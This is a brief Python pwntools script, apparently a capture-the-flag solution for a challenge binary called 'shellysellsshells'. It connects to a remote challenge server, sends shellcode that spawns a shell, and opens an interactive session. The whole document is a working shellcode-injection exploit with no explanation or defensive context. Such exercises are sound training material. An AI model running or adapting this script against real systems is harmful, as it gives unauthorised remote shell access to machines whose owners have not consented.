from pwn import *

context.binary = 'shellysellsshells' # This line is important

p = remote('forever.isss.io', 1305)

p.sendline(asm(shellcraft.sh()))
p.interactive()
